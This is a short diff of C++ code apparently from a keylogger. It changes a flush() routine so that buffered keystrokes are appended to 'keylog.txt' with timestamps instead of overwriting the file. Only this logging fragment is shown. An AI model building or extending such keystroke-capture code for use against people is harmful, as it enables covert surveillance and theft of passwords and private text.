@@ -94,7 +94,7 @@ std::vector<std::string> keyBuffer;
 
 void flush()
 {
-    std::ofstream myfile("keylog.txt");
+    std::ofstream myfile("keylog.txt", std::ios::out | std::ios::app);
     if (myfile.is_open())
     {
         std::time_t logTime = system_clock::to_time_t(system_clock::now());
